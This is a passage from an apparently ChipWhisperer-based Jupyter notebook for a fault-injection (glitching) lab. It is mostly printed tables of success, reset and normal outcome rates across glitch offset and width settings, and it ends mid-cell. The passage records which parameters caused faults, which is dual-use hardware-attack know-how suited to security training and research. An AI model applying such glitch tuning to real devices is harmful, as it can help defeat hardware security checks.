       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((64,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((63,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((62,),\n",
       "  {'total': 51,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 4,\n",
       "   'reset_rate': 0.0784313725490196,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9215686274509803}),\n",
       " ((61,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.0625,\n",
       "   'normal': 45,\n",
       "   'normal_rate': 0.9375}),\n",
       " ((60,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((59,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((58,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((57,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((56,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((55,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.06,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.94}),\n",
       " ((54,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((53,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.96}),\n",
       " ((52,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((51,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.96}),\n",
       " ((50,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.061224489795918366,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9387755102040817}),\n",
       " ((49,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((47,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((46,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((43,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((42,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((41,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.06,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.94}),\n",
       " ((40,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((39,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((38,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((37,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((36,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((35,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((34,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((33,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((32,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.06,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.94}),\n",
       " ((31,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((30,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((29,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((28,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((27,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.96}),\n",
       " ((26,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((25,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((24,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((23,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((22,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((21,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((20,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((19,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((18,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.06,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.94}),\n",
       " ((17,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.061224489795918366,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9387755102040817}),\n",
       " ((16,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((15,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((14,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((13,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.020833333333333332,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9791666666666666}),\n",
       " ((12,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 1,\n",
       "   'reset_rate': 0.02040816326530612,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9795918367346939}),\n",
       " ((11,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.04081632653061224,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.9591836734693877}),\n",
       " ((10,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.06,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.94}),\n",
       " ((9,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 4,\n",
       "   'reset_rate': 0.08,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.92}),\n",
       " ((8,),\n",
       "  {'total': 49,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.061224489795918366,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9387755102040817}),\n",
       " ((7,),\n",
       "  {'total': 50,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 3,\n",
       "   'reset_rate': 0.06,\n",
       "   'normal': 47,\n",
       "   'normal_rate': 0.94}),\n",
       " ((6,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 2,\n",
       "   'reset_rate': 0.041666666666666664,\n",
       "   'normal': 46,\n",
       "   'normal_rate': 0.9583333333333334}),\n",
       " ((5,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2,),\n",
       "  {'total': 52,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 4,\n",
       "   'reset_rate': 0.07692307692307693,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 0.9230769230769231}),\n",
       " ((1,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 4,\n",
       "   'reset_rate': 0.08333333333333333,\n",
       "   'normal': 44,\n",
       "   'normal_rate': 0.9166666666666666}),\n",
       " ((0,),\n",
       "  {'total': 48,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 48,\n",
       "   'normal_rate': 1.0})]"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results = gc.calc(ignore_params=[\"width\", \"offset\"], sort=\"success_rate\")\n",
    "results"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And one for your width/offset settings:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[((2.0, -4),\n",
       "  {'total': 112,\n",
       "   'success': 2,\n",
       "   'success_rate': 0.017857142857142856,\n",
       "   'reset': 37,\n",
       "   'reset_rate': 0.33035714285714285,\n",
       "   'normal': 73,\n",
       "   'normal_rate': 0.6517857142857143}),\n",
       " ((0.8, -4),\n",
       "  {'total': 114,\n",
       "   'success': 2,\n",
       "   'success_rate': 0.017543859649122806,\n",
       "   'reset': 42,\n",
       "   'reset_rate': 0.3684210526315789,\n",
       "   'normal': 70,\n",
       "   'normal_rate': 0.6140350877192983}),\n",
       " ((2.0, -3.6),\n",
       "  {'total': 105,\n",
       "   'success': 1,\n",
       "   'success_rate': 0.009523809523809525,\n",
       "   'reset': 6,\n",
       "   'reset_rate': 0.05714285714285714,\n",
       "   'normal': 98,\n",
       "   'normal_rate': 0.9333333333333333}),\n",
       " ((3.5999999999999996, -2.0000000000000004),\n",
       "  {'total': 109,\n",
       "   'success': 1,\n",
       "   'success_rate': 0.009174311926605505,\n",
       "   'reset': 26,\n",
       "   'reset_rate': 0.23853211009174313,\n",
       "   'normal': 82,\n",
       "   'normal_rate': 0.7522935779816514}),\n",
       " ((3.5999999999999996, -2.4000000000000004),\n",
       "  {'total': 102,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 4,\n",
       "   'reset_rate': 0.0392156862745098,\n",
       "   'normal': 98,\n",
       "   'normal_rate': 0.9607843137254902}),\n",
       " ((3.5999999999999996, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.5999999999999996, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.5999999999999996, -3.6),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.5999999999999996, -4),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.1999999999999997, -2.0000000000000004),\n",
       "  {'total': 105,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 12,\n",
       "   'reset_rate': 0.11428571428571428,\n",
       "   'normal': 93,\n",
       "   'normal_rate': 0.8857142857142857}),\n",
       " ((3.1999999999999997, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.1999999999999997, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.1999999999999997, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.1999999999999997, -3.6),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((3.1999999999999997, -4),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.8, -2.0000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.8, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.8, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.8, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.8, -3.6),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.8, -4),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.4, -2.0000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.4, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.4, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.4, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.4, -3.6),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.4, -4),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.0, -2.0000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.0, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.0, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((2.0, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.6, -2.0000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.6, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.6, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.6, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.6, -3.6),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.6, -4),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.2000000000000002, -2.0000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.2000000000000002, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.2000000000000002, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.2000000000000002, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.2000000000000002, -3.6),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((1.2000000000000002, -4),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((0.8, -2.0000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((0.8, -2.4000000000000004),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((0.8, -2.8000000000000003),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((0.8, -3.2),\n",
       "  {'total': 101,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 0,\n",
       "   'reset_rate': 0.0,\n",
       "   'normal': 101,\n",
       "   'normal_rate': 1.0}),\n",
       " ((0.8, -3.6),\n",
       "  {'total': 110,\n",
       "   'success': 0,\n",
       "   'success_rate': 0.0,\n",
       "   'reset': 26,\n",
       "   'reset_rate': 0.23636363636363636,\n",
       "   'normal': 84,\n",
       "   'normal_rate': 0.7636363636363637})]"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results = gc.calc(ignore_params=[\"ext_offset\"], sort=\"success_rate\")\n",
    "results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "from tqdm.notebook import tqdm\n",
    "import re\n",
    "import struct\n",
    "from chipwhisperer import logging\n",
    "# gc.set_global_step(step)\n",
    "cw.glitch_logger.setLevel(logging.ERROR)\n",
    "\n",
